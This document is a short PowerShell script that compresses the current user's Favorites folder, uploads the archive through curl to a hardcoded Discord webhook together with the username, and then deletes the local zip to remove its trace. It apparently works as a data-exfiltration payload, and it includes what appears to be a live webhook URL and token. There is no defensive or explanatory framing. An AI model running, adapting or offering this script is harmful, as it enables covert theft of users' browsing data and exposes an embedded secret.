############################################################################################################################################################

# Get the current user's Favorites folder
$FavoritesPath = "$env:USERPROFILE\Favorites"

# Set the name for the zip file
$FolderName = "FavoritesBackup"
$ZIP = "$FolderName.zip"

# Compress the Favorites folder into a zip
Compress-Archive -Path $FavoritesPath -DestinationPath $env:tmp/$ZIP

############################################################################################################################################################

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = "https://discord.com/api/webhooks/1296507555014774784/Crdw68n9e0pGIBNpQOi9z8hRIs5Pn0mkTmjUlZT8NcKLfVi-i8roVzfYYdZ28nY8zAke"

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
    Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
};

if (-not ([string]::IsNullOrEmpty($file))){
    curl.exe -F "file1=@$file" $hookurl
}
}

# Upload the zip file to Discord
Upload-Discord -file "$env:tmp/$ZIP"

############################################################################################################################################################

# Clean up - remove the zip file from temp folder
Remove-Item "$env:tmp/$ZIP" -Force

############################################################################################################################################################
